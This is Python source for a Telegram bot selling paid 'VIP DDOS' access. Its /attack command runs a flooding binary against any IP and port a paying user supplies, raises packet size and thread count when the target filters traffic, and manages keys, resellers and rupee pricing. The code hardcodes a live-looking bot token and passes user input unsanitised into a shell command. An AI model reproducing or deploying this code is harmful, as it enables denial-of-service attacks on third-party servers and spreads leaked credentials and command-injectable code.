import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import re

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM')

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}

# Files for data storage
DATA_DIR = "bot_data"
USER_FILE = os.path.join(DATA_DIR, "users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
resellers = {}
last_attack_time = {}
COOLDOWN_PERIOD = 60

def ensure_files_and_folders():
    """Create data directory and initialize all required files if they don't exist."""
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
        print(f"Created directory: {DATA_DIR}")

    # Initialize files with default content if they don't exist or are empty/invalid
    file_defaults = {
        USER_FILE: {},
        KEY_FILE: {},
        RESELLERS_FILE: {},
        AUTHORIZED_USERS_FILE: {},
        COOLDOWN_FILE: {"cooldown": 60},
        LOG_FILE: "",  # Empty text file
        BLOCK_ERROR_LOG: ""  # Empty text file
    }

    for file_path, default_content in file_defaults.items():
        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
            try:
                mode = 'w' if isinstance(default_content, str) else 'w'
                with open(file_path, mode) as f:
                    if isinstance(default_content, str):
                        f.write(default_content)
                    else:
                        json.dump(default_content, f, indent=4)
                print(f"Initialized: {file_path}")
            except Exception as e:
                print(f"Error initializing {file_path}: {str(e)}")

def read_json_file(file_path, default={}):
    """Read JSON file with error handling, return default if file is missing or invalid."""
    try:
        with open(file_path, "r") as file:
            data = json.load(file)
            return data if isinstance(data, dict) else default
    except (FileNotFoundError, json.JSONDecodeError, ValueError):
        print(f"Error reading {file_path}, returning default.")
        return default

def save_json_file(file_path, data):
    """Save JSON file with error handling."""
    try:
        with open(file_path, "w") as file:
            json.dump(data, file, indent=4)
        print(f"Saved: {file_path}")
    except Exception as e:
        print(f"Error saving {file_path}: {str(e)}")

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    save_json_file(COOLDOWN_FILE, {"cooldown": seconds})

def load_cooldown():
    global COOLDOWN_PERIOD
    data = read_json_file(COOLDOWN_FILE, {"cooldown": 60})
    COOLDOWN_PERIOD = data.get("cooldown", 60)

def load_data():
    global users, keys, authorized_users, resellers
    ensure_files_and_folders()
    users = read_json_file(USER_FILE)
    keys = read_json_file(KEY_FILE)
    authorized_users = read_json_file(AUTHORIZED_USERS_FILE)
    resellers = read_json_file(RESELLERS_FILE)
    load_cooldown()
    # Fix keys with missing fields
    for key, value in keys.items():
        if "generated_time" not in value:
            value["generated_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
            value["generated_by"] = "Unknown"
    save_json_file(KEY_FILE, keys)
    print(f"Data loaded successfully. Keys: {list(keys.keys())}")

def save_users():
    save_json_file(USER_FILE, users)

def save_keys():
    save_json_file(KEY_FILE, keys)

def save_authorized_users():
    save_json_file(AUTHORIZED_USERS_FILE, authorized_users)

def save_resellers():
    save_json_file(RESELLERS_FILE, resellers)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack completed")

def execute_attack(target, port, time, packet_size, threads, chat_id, username, last_attack_time, user_id, retry_count=0):
    try:
        if time > 1800:
            bot.send_message(chat_id, "Error: use less than 1800 seconds")
            return
        if retry_count > 2:
            bot.send_message(chat_id, "Error: Max retry attempts reached. Attack failed.")
            return
        if packet_size < 1400:
            packet_size = 1400
        if threads < 512:
            threads = 512

        print(f"Attack started at {datetime.datetime.now(IST)}: {target}:{port}, Packet Size: {packet_size}, Threads: {threads}")
        full_command = f"./Rohan {target} {port} {time} {packet_size} {threads}"
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot.send_message(chat_id, f"Attack command sent: {target}:{port}, {time}s, Packet Size: {packet_size}, Threads: {threads}")
        stdout, stderr = process.communicate()
        output = stdout.decode()
        error = stderr.decode()
        print(f"Attack command output: {output}, errors: {error}")

        failure_rate = 0.0
        for line in output.splitlines():
            if line.startswith("FAILURE_RATE:"):
                try:
                    failure_rate = float(line.split(":")[1])
                except ValueError:
                    failure_rate = 0.0
                break

        if failure_rate >= 90.0 and failure_rate <= 100.0:
            bot.send_message(chat_id, f"Warning: High failure rate ({failure_rate:.2f}%). Increasing packet size/threads and retrying...")
            new_packet_size = packet_size + 200
            new_threads = threads + 128
            print(f"Retrying with Packet Size: {new_packet_size}, Threads: {new_threads}")
            execute_attack(target, port, time, new_packet_size, new_threads, chat_id, username, last_attack_time, user_id, retry_count + 1)
            return
        elif failure_rate > 50.0:
            bot.send_message(chat_id, f"Notice: Moderate failure rate ({failure_rate:.2f}%). Attack completed but may have been partially filtered.")

        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: {threads}\nFailure Rate: {failure_rate:.2f}%\nAttacker: @{username}"
        bot.send_message(chat_id, response)
        threading.Timer(time, send_attack_finished_message, [chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
    except Exception as e:
        print(f"Attack error: {str(e)}")
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    username = message.from_user.username or f"UserID_{user_id}"
    has_access = False
    if user_id in admin_id:
        has_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    if not has_access:
        bot.reply_to(message, "Unauthorized Access! Use /redeem <key_name> (e.g., /redeem Rahul_sadiq-rahul) or buy access for 50₹. Make payment and DM @Rahul_618 to get a key or ask an admin to authorize you.")
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
            return
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return
    target = command[1]
    try:
        port = int(command[2])
        time = int(command[3])
        packet_size = 1400
        threads = 512
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        execute_attack(target, port, time, packet_size, threads, chat_id, username, last_attack_time, user_id)
    except ValueError:
        bot.reply_to(message, "Invalid port or time format.")

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /addreseller <user_id> <balance>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid balance amount")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers()
        bot.reply_to(message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} already exists")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    command = message.text.split()
    if user_id in admin_id or user_id in resellers:
        if len(command) != 3:
            bot.reply_to(message, "Usage: /genkey <duration> <key_name>\nExample: /genkey 1d rahul")
            return
        duration = command[1].lower()
        key_name = command[2]
    else:
        bot.reply_to(message, "Access Denied: Admin or reseller only command")
        return
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        bot.reply_to(message, "Invalid duration. Use formats like 30min, 1h, 1d, 1m")
        return
    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"
    custom_key = f"Rahul_sadiq-{key_name}"
    device_limit = 1
    user_info = bot.get_chat(user_id)
    generated_by = user_info.username if user_info.username else f"UserID_{user_id}"
    key_data = {
        "duration": duration,
        "device_limit": device_limit,
        "devices": keys.get(custom_key, {}).get("devices", []),
        "blocked": keys.get(custom_key, {}).get("blocked", False),
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    keys[custom_key] = key_data
    save_keys()
    for user_id in key_data["devices"]:
        if user_id in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_users()
    response = f"Key {'updated' if custom_key in keys else 'generated'} successfully\nKey: `{custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit}\nGenerated by: @{generated_by}\nGenerated on: {key_data['generated_time']}"
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_resellers()
            response += f"\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    help_text = """
VIP DDOS HELP GUIDE
BOT CONTROLS:
- /start - Start the bot
- /help - Show this guide
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack (admin and authorized users only)
- /setcooldown <seconds> - Set the attack cooldown period (admin only)
- /checkcooldown - Check the current cooldown period
- /addreseller <user_id> <balance> - Add a new reseller (admin only)
- /genkey <duration> <key_name> - Generate a key (admin and resellers only)
- /logs - View recent logs (admin only)
- /users - List authorized users (admin only)
- /add <user_id> - Add user ID for access without a key (admin only)
- /remove <user_id> - Remove a user (admin only)
- /resellers - View resellers
- /addbalance <reseller_id> <amount> - Add balance to a reseller (admin only)
- /removereseller <reseller_id> - Remove a reseller (admin only)
- /block <key_name> - Block a key (admin only)
- /redeem <key_name> - Redeem your key (e.g., /redeem Rahul_sadiq-rahul)
- /balance - Check your reseller balance (resellers only)
- /myinfo - View your user information
- /listkeys - List all keys with details (admin only)
EXAMPLE:
- /genkey 1d rahul - Generate a 1-day key (Key: Rahul_sadiq-rahul)
- /genkey 30min rahul - Generate a 30-minute key (Key: Rahul_sadiq-rahul)
- /attack 192.168.1.1 80 120 - Launch an attack (if authorized)
- /setcooldown 120 - Set cooldown to 120 seconds (admin only)
- /checkcooldown - View current cooldown
- /redeem Rahul_sadiq-rahul - Redeem your key
- /listkeys - View all keys (admin only)
Buy key from @Rahul_618
Any problem contact @Rahul_618
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance} Rs"
    else:
        response = "Access Denied: Reseller only command"
    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /redeem <key_name>\nExample: /redeem Rahul_sadiq-rahul")
        return
    key = command[1].strip()
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        bot.reply_to(message, "Admin/Authorized User: No need to redeem a key.")
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                bot.reply_to(message, f"You already have an active key!\nYour access expires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\nPlease wait until it expires to redeem a new key. To extend access, buy a new key for 50₹ after expiration and DM @Rahul_618.")
                return
            else:
                del users[user_id]
                save_users()
        except ValueError:
            bot.reply_to(message, "Error: Invalid expiration date format in your user data. Contact the admin: @Rahul_618")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            bot.reply_to(message, "This key has been blocked. Contact the admin: @Rahul_618")
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            bot.reply_to(message, "Key has reached its device limit.")
            return
        if user_id in keys[key]["devices"]:
            bot.reply_to(message, "You have already redeemed this key.")
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            bot.reply_to(message, "Invalid duration in key. Contact the admin: @Rahul_618")
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        bot.reply_to(message, f"Key redeemed successfully!\nYour access expires on: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
    else:
        bot.reply_to(message, "Invalid or expired key! Buy a new key for 50₹. Make payment and DM @Rahul_618.")

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul")
        return
    key_name = command[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        bot.reply_to(message, "Invalid key format. Key must start with 'Rahul_sadiq-'")
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            bot.reply_to(message, f"Key '{key_name}' is already blocked.\nBlocked by: @{blocker_username}\nBlocked on: {block_time}")
            return
        user_info = bot.get_chat(user_id)
        blocker_username = user_info.username if user_info.username else f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        save_keys()
        bot.reply_to(message, f"Key '{key_name}' has been blocked successfully.\nBlocked by: @{blocker_username}\nBlocked on: {block_time}")
    else:
        bot.reply_to(message, f"Key '{key_name}' not found. Check keys.json or regenerate the key.")
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} failed. Available keys: {list(keys.keys())}\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /add <user_id>\nExample: /add 1807014348")
        return
    target_user_id = command[1]
    if target_user_id in authorized_users:
        bot.reply_to(message, f"User {target_user_id} is already authorized.")
        return
    expiration_time = add_time_to_current_date(months=1)
    authorized_users[target_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_authorized_users()
    bot.reply_to(message, f"User {target_user_id} added with access until {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "No data found")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    has_active_access = False
    if user_id in admin_id:
        has_active_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except ValueError:
            has_active_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except ValueError:
            has_active_access = False
    response = "WELCOME TO VIP DDOS\nUse /help to see all available commands"
    if not has_active_access:
        response += "\nTo use attack features, use /redeem <key_name> (e.g., /redeem Rahul_sadiq-rahul) or buy access for 50₹. Make payment and DM @Rahul_618 to get a key or ask an admin to authorize you."
    bot.reply_to(message, response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        if seconds < 0:
            bot.reply_to(message, "Cooldown must be non-negative")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown set to {seconds} seconds")
    except ValueError:
        bot.reply_to(message, "Invalid cooldown value. Please provide a number.")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    bot.reply_to(message, f"Current cooldown period: {COOLDOWN_PERIOD} seconds")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "No username"
    my_key = "No key"
    role = "Guest"
    expiration = "No expiration"
    if user_id in admin_id:
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
    elif user_id in users:
        role = "User"
        try:
            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
            my_key = [k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]][0] if any(user_id in v["devices"] for v in keys.values()) else "No key"
        except (ValueError, IndexError):
            expiration = "Invalid expiration"
    elif user_id in authorized_users:
        role = "Authorized User"
        try:
            expiration = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
        except ValueError:
            expiration = "Invalid expiration"
    response = (
        f"USER INFORMATION\n"
        f"Username: @{username}\n"
        f"UserID: {user_id}\n"
        f"My key: {my_key}\n"
        f"Role: {role}\n"
        f"Expiration: {expiration}\n"
    )
    if role == "Reseller":
        response += f"Balance: {balance} Rs\n"
    response += "Buy key from @Rahul_618\nAny problem contact @Rahul_618"
    bot.reply_to(message, response)

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Authorized Users\n"
    all_users = {**users, **authorized_users}
    if all_users:
        for user, expiration in all_users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"User ID: {user}\nUsername: @{username}\nExpires On: {formatted_expiration}\n"
    else:
        response = "No authorized users found."
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"User {target_user_id} removed from key-based access."
    elif target_user_id in authorized_users:
        del authorized_users[target_user_id]
        save_authorized_users()
        response = f"User {target_user_id} removed from authorized access."
    else:
        response = f"User {target_user_id} not found in authorized users."
    bot.reply_to(message, response)

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    response = "Authorized Resellers\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id).username else "Unknown"
            response += f"Username: @{reseller_username}\nUserID: {reseller_id}\nBalance: {balance} Rs\n"
    else:
        response += "No reseller found"
    bot.reply_to(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id = command_parts[1]
    try:
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "Reseller ID not found")
            return
        resellers[reseller_id] += amount
        save_resellers()
        bot.reply_to(message, f"Balance Successfully added\nBalance: {amount} Rs\nReseller ID: {reseller_id}\nNew balance: {resellers[reseller_id]} Rs")
    except ValueError:
        bot.reply_to(message, "Invalid amount")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /removereseller <reseller_id>")
        return
    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "Reseller ID not found.")
        return
    del resellers[reseller_id]
    save_resellers()
    bot.reply_to(message, f"Reseller {reseller_id} has been removed successfully")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Key List\n"
    if keys:
        for key_name, key_data in keys.items():
            generated_by = key_data.get("generated_by", "Unknown")
            generated_time = key_data.get("generated_time", "Unknown")
            devices = key_data.get("devices", [])
            blocked = key_data.get("blocked", False)
            active = any(user_id in users and datetime.datetime.now(IST) < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) for user_id in devices) and not blocked
            status = "Active" if active else "Inactive"
            device_details = "\n".join([f"  User ID: {user_id}\n  Username: @{bot.get_chat(user_id).username if bot.get_chat(user_id).username else 'Unknown'}\n  Expiration: {users.get(user_id, 'N/A')}" for user_id in devices]) if devices else "No users"
            blocker_username = key_data.get("blocked_by_username", "N/A")
            block_time = key_data.get("blocked_time", "N/A")
            response += (
                f"Key: `{key_name}`\n"
                f"Generated by: @{generated_by}\n"
                f"Generated on: {generated_time}\n"
                f"Duration: {key_data['duration']}\n"
                f"Device Limit: {key_data['device_limit']}\n"
                f"Devices:\n{device_details}\n"
                f"Status: {status}\n"
                f"Blocked: {blocked}\n"
                f"Blocked by: @{blocker_username}\n"
                f"Blocked on: {block_time}\n\n"
            )
    else:
        response = "No keys found."
    bot.reply_to(message, response, parse_mode='Markdown')

if __name__ == "__main__":
    load_data()
    while True:
        try:
            print("Bot started! 🚀")
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot error: {str(e)}")
            time.sleep(1)